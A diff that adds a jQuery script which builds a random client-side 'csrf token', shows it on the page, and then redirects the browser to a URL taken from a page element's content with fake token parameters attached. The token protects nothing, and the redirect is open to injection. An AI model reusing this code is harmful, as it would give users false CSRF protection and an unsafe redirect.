@@ -1,0 +1,22 @@
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    if (window.location.href.indexOf("csrf=online") <= 1) {
+      setTimeout(randomString, 500);
+      function randomString(length, chars) {
+        refcount = Math.floor(Math.random() * 100000) + 1;
+        var result = '';
+        for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+        return result;
+        }
+        csrf = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+        document.getElementById("csrfid").innerHTML = (csrf);
+        setTimeout(refrsh, 1000);
+        function refrsh() {
+          document.getElementById("currenturl").innerHTML = (window.location.href);
+          updatedurl = document.getElementById("userinfo").innerHTML
+          window.location.replace(updatedurl+"/?csrf=online&csrf-token="+csrf+"&ref%20count="+refcount);
+        }
+    }
+  });
+</script>
